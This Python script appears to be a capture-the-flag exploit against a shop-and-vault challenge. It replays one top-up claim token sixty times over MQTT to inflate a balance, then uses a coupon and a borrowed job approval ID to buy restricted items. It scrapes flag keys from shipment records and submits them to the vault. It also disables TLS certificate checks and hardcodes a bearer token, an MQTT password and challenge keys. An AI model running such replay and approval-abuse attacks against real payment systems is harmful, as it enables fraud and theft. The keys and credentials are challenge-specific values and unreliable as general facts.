"""Fresh-scene full run: topup replay -> buy badge/crown/gold -> collect keys
-> submit all six -> read flag."""
import json
import os
import ssl
import time
import uuid

import paho.mqtt.client as mqtt
import requests

B = os.environ["GITQ_BASE"]
H = {"Authorization": "Bearer " + os.environ.get("GITQ_HTTP_TOKEN", "alice-token-7f3d9c")}
HOST = os.environ["GITQ_MQTT_HOST"]
PORT = int(os.environ.get("GITQ_MQTT_PORT", "58999"))
LOG = "evidence/fresh_scene_run.log"

KEYS = {
    "k1": "key1-9f27c4a1d3e8",
    "k3": "key3-77aa02d4f1c6",
    "k5": "key5-20df77ac19b3",
    "k6": "key6-8831bb55e04f",
}


def log(s):
    print(s, flush=True)
    open(LOG, "a", encoding="utf-8").write(str(s) + "\n")


def get(path):
    try:
        r = requests.get(B + path, headers=H, timeout=10)
        return r.status_code, r.text.strip()
    except Exception as e:
        return None, "ERR %s" % e


def post(path, body=None):
    try:
        r = requests.post(B + path, headers=H, json=body, timeout=15)
        return r.status_code, r.text.strip()
    except Exception as e:
        return None, "ERR %s" % e


log("=== FRESH SCENE %s ===" % B)
log("vault0 %s" % (get("/api/vault"),))
log("bal0 %s" % (get("/api/balance"),))

sc, body = post("/api/topup")
log("topup %s %s" % (sc, body))
if sc != 200:
    raise SystemExit("topup not 200")
token = json.loads(body)["claim_token"]

# MQTT
try:
    c = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, client_id="alice-scribe", protocol=mqtt.MQTTv311)
except AttributeError:
    c = mqtt.Client(client_id="alice-scribe", protocol=mqtt.MQTTv311)
c.username_pw_set(
    os.environ.get("GITQ_MQTT_USER", "alice"),
    os.environ.get("GITQ_MQTT_PASSWORD", "alice-mqtt-s3cret"),
)
c.tls_set(cert_reqs=ssl.CERT_NONE)
c.tls_insecure_set(True)
st = {"ok": False}


def on_con(cl, u, f, rc, p=None):
    st["ok"] = True
    cl.subscribe([("tenant/alice/#", 1), ("public/#", 1)])


c.on_connect = on_con
c.on_message = lambda cl, u, m: log("RECV %s %s" % (m.topic, m.payload.decode("utf-8", "replace")))
c.connect(HOST, PORT, 30)
c.loop_start()
t0 = time.time()
while not st["ok"] and time.time() - t0 < 15:
    time.sleep(0.1)
if not st["ok"]:
    raise SystemExit("mqtt fail")

t_start = time.time()
for i in range(60):
    p = {"type": "topup.requested", "claim_token": token, "user": "alice",
         "topup_id": "fs-%d-%s" % (i, uuid.uuid4().hex[:10]), "amount": 100, "credit": 100}
    c.publish("tenant/alice/topup/events", json.dumps(p), qos=0)
    time.sleep(0.03)
log("replay 60 msgs in %.1fs" % (time.time() - t_start))
time.sleep(4)
log("bal_after_replay %s" % (get("/api/balance"),))

# buy
def order(item, coupon=None, approval=None):
    b = {"item": item}
    if coupon:
        b["coupon"] = coupon
    if approval:
        b["approval_id"] = approval
    sc, body = post("/api/orders", b)
    log("ORDER %s %s" % (json.dumps(b), body))
    try:
        return json.loads(body).get("order_id") or json.loads(body).get("id")
    except Exception:
        return None


# echo job for approval (may be needed for restricted badge)
sc, ebody = post("/api/jobs", {"type": "echo", "payload": {"m": 1}})
approval = None
try:
    approval = json.loads(ebody).get("approval_id")
except Exception:
    pass
log("approval %s" % approval)

bal = get("/api/balance")[1]
try:
    balv = json.loads(bal).get("balance", 0)
except Exception:
    balv = 0

ids = {}
# crown first (most expensive), with coupon if balance modest
ids["crown"] = order("key4-crown", "GHOST60")
time.sleep(0.5)
ids["badge"] = order("key2-badge", None, approval)
time.sleep(0.5)
ids["gold1"] = order("gold-plate", None)
time.sleep(0.5)
ids["gold2"] = order("gold-plate", None)
time.sleep(4)

log("shipments %s" % (get("/api/shipments")[1][:4000],))
log("orders %s" % (get("/api/orders")[1][:2000],))
log("alerts(see RECV) vault %s" % (get("/api/vault")[1],))

# submit known + discovered keys
text = get("/api/shipments")[1]
import re
found = set(re.findall(r"key[1-6]-[0-9a-f]{12}", text))
log("found_in_shipments %s" % sorted(found))
keys = dict(KEYS)
for k in found:
    keys[k.split("-")[0]] = k
# also alerts may carry key3
for k in list(keys.values()):
    sc, body = post("/api/vault/submit", {"key": k})
    log("submit %s -> %s %s" % (k, sc, body))
log("VAULT FINAL %s" % (get("/api/vault"),))

time.sleep(1)
c.loop_stop()
c.disconnect()
